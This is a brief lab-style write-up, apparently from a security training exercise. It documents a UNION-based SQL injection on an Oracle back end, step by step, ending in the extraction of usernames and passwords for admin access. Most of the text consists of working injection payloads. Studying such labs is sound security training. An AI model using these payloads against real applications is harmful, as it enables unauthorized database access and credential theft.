# listing on Oracle database

list query

``` sqli
select * from all_tables
```

listing via column query

``` sqli
select * from all_tab_column where table_name='Users'
```

end goal : listing content of database

need to find columns

```sqli
' order by 1--
' order by 2--
```

two columns

String data type query

```sqli
' union select 'a', 'a' from dual--
```

both column contains string

finding tables name

```sqli
' union select table_name, NULL from all_tables-- 
```

got the tables

now retireving more the data of column

```sqli
' union select column_name, NULL from all_tab_columns where table_name='USERS_ERVCVG
'-- 
```sqli
got the column of user and password

```sqli
' union select USERNAME_HZHOFM
, PASSWORD_MHVDJN from USERS_ERVCVG-- 
```

got the password for admin access
